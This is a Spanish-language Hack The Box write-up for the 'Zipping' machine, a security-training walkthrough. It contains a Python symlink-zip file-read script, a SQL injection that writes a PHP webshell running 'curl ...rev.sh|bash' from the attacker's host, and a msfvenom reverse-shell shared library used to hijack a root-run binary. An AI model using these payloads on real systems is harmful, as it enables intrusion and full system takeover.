---
layout: single
title: Zipping - Hack The Box
excerpt: "Zipping es una máquina vulnerable de HackTheBox que cuenta con una vulnerabilidad LFI, que nos permite ver archivos locales de la máquina. Esto nos permite descubrir una injection SQL, que nos permite insertar una webshell para poder ejecutar comandos.Luego elevamos privilegios a root mediante una mala configuración de una aplicación."
date: 2023-10-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-zipping/zipping-logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - lfi 
  - reversing
  - webshell
---
![](/assets/images/htb-writeup-zipping/zipping-logo.jpg)

Zipping es una máquina de dificultad media, que contiene una vulnerabilidad LFI, que nos permite descubrir una inyección SQL en el cual podemos alojar una webshell.Luego la elevación de privilegios a root es mediante una mala configuración de una aplicación.

## Enumeración

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta **nmap**. En el cual logramos detectar dos servicios(ssh,http).

```bash
# Nmap 7.93 scan initiated Wed Sep 13 11:07:57 2023 as: nmap -sCV -p22,80 -oN object.nmap 10.10.11.229
Nmap scan report for 10.10.11.229
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)
|_  256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 13 11:08:11 2023 -- 1 IP address (1 host up) scanned in 14.09 seconds
```

### Página web

Al ingresar al servidor web, observamos que nos permite subir un archivo zip, esto acontece a una carga automática de archivos Zip descomprimidos. Hacktricks comenta acerca de esta vulnerabilidad.

![](/assets/images/htb-writeup-zipping/zipping_hacktricks.png)

### Automatización de lectura de archivos remotos

```python
import requests,subprocess,sys,re

def upload_file():
    url = 'http://10.10.11.229/upload.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://10.10.11.229/upload.php',
        'Origin': 'http://10.10.11.229',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    files = {
        'zipFile': ('test.zip', open('test.zip', 'rb'), 'application/zip'),
        'submit': (None, '')
    }
    response = requests.post(url, headers=headers, files=files).text
    path_upload = re.findall(r'<a href="(.*?)">',response)[1]
#    breakpoint()
    url_path_lfi = "http://10.10.11.229/"+path_upload
    print(requests.get(url_path_lfi).text)
    comando3 = ["rm","-r","simple.pdf","test.zip"]
    subprocess.run(comando3,check=True)

def upload_file_zip():
    file_lfi = sys.argv[1]
    comando1 = ["ln", "-s", "../../../../../../../../../../../..%s"%file_lfi, "simple.pdf"]
    subprocess.run(comando1, check=True)
    comando2 = ["zip", "--symlinks", "test.zip", "simple.pdf"]
    subprocess.run(comando2, check=True)


if __name__ == '__main__':
    upload_file_zip()
    upload_file()
```

### Inyección SQL

Al examinar los distintos archivos web, podemos analizar una potencial ejecución de comandos SQL(Inyección SQL).

```php

➜  exploit python3 upload_file.py /var/www/html/shop/product.php
  adding: simple.pdf (stored 0%)
<?php
// Check to make sure the id parameter is specified in the URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
        // Fetch the product from the database and return the result as an Array
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if (!$product) {
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }
} else {
    // Simple error to display if the id wasn't specified
    exit('No ID provided!');
}
?>

<?=template_header('Zipping | Product')?>

<div class="product content-wrapper">
    <img src="assets/imgs/<?=$product['img']?>" width="500" height="500" alt="<?=$product['name']?>">
    <div>
        <h1 class="name"><?=$product['name']?></h1>
        <span class="price">
            &dollar;<?=$product['price']?>
            <?php if ($product['rrp'] > 0): ?>
            <span class="rrp">&dollar;<?=$product['rrp']?></span>
            <?php endif; ?>
        </span>
        <form action="index.php?page=cart" method="post">
            <input type="number" name="quantity" value="1" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
            <input type="hidden" name="product_id" value="<?=$product['id']?>">
            <input type="submit" value="Add To Cart">
        </form>
        <div class="description">
            <?=$product['desc']?>
        </div>
    </div>
</div>

<?=template_footer()?>
```

Acá se nos informa que hay una vulnerabilidad de SQL injection.

![](/assets/images/htb-writeup-zipping/zipping_sql_injection.png)


### webshell

Una vez identificado la vulnerabilidad, procedemos a ejecutarla.

```bash
curl -s $'http://zipping.htb/shop/index.php?page=product&id=%0a%27%3Bselect%20%27%3C%3Fphp%20system%28%22curl%20http%3A%2F%2F10.10.14.211%2Frev.sh%7Cbash%22%29%3B%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Fcxshell.php%27%20%231'

#Decode url
%0a -> Salto de linea
';select '<?php system("curl 10.10.14.211/rev.sh|bash");?>' into outfile '/var/lib/mysql/cxshell.php' #1

curl -s $'http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2fcxshell' # Para que interprete el código PHP
```


## Escalada de privilegios


Una vez que hemos ganado acceso al sistema, podemos llevar a cabo un análisis de privilegios utilizando el comando 'sudo -l', lo que nos permite identificar los permisos específicos otorgados, incluyendo la capacidad de ejecutar la herramienta 'stock' como el usuario 'root' o cualquier otro usuario dentro del sistema.



```bash
rektsu@zipping:/home/rektsu$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
rektsu@zipping:/home/rektsu$ 
```





Aplicamos el comando 'strings' a la herramienta, lo que nos permitió recuperar la contraseña necesaria solicitada por la aplicación para continuar con la ejecución del programa.

![](/assets/images/htb-writeup-zipping/password_tools.png)


### Explotación

Empleamos el comando 'strace' para llevar a cabo un análisis de seguimiento a nivel del sistema, permitiéndonos examinar exhaustivamente las acciones y las solicitudes realizadas por el programa en ejecución.


```bash
rektsu@zipping:/home/rektsu$ strace /usr/bin/stock 
execve("/usr/bin/stock", ["/usr/bin/stock"], 0x7ffc6d2fc2d0 /* 17 vars */) = 0
brk(NULL)                               = 0x558c83def000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe9bc27b10) = -1 EINVAL (Invalid argument)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f792467a000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=18225, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f7924675000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\3206\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2072888, ...}, AT_EMPTY_PATH) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f7924400000
mmap(0x7f7924422000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7f7924422000
mmap(0x7f792459b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7f792459b000
mmap(0x7f79245f2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7f79245f2000
mmap(0x7f79245f8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f79245f8000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7924672000
arch_prctl(ARCH_SET_FS, 0x7f7924672740) = 0
set_tid_address(0x7f7924672a10)         = 29322
set_robust_list(0x7f7924672a20, 24)     = 0
rseq(0x7f7924673060, 0x20, 0, 0x53053053) = 0
mprotect(0x7f79245f2000, 16384, PROT_READ) = 0
mprotect(0x558c83244000, 4096, PROT_READ) = 0
mprotect(0x7f79246b0000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f7924675000, 18225)           = 0
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}, AT_EMPTY_PATH) = 0
getrandom("\xa8\xaa\x17\x41\x02\xdc\x56\x5a", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x558c83def000
brk(0x558c83e10000)                     = 0x558c83e10000
newfstatat(0, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}, AT_EMPTY_PATH) = 0
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

Observamos que el programa en cuestión requiere un archivo denominado '/home/rektsu/.config/libcounter.so', el cual identificamos como un punto de intervención donde podemos realizar modificaciones y ejecutar acciones según nuestras necesidades.

### Creación del archivo .so.

Generamos un archivo de objeto compartido (.so) con contenido malicioso y lo ubicamos en la ruta donde el programa en ejecución hace referencia a su llamada.

```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=10.10.14.211 \
LPORT=443 -f elf-so -o libcounter.so
```

Transferimos el archivo manipulado al equipo objetivo y, una vez allí, ejecutamos la aplicación 'stock' con privilegios de superusuario (root), lo que nos proporcionaría el acceso a nivel de superusuario en el sistema objetivo.
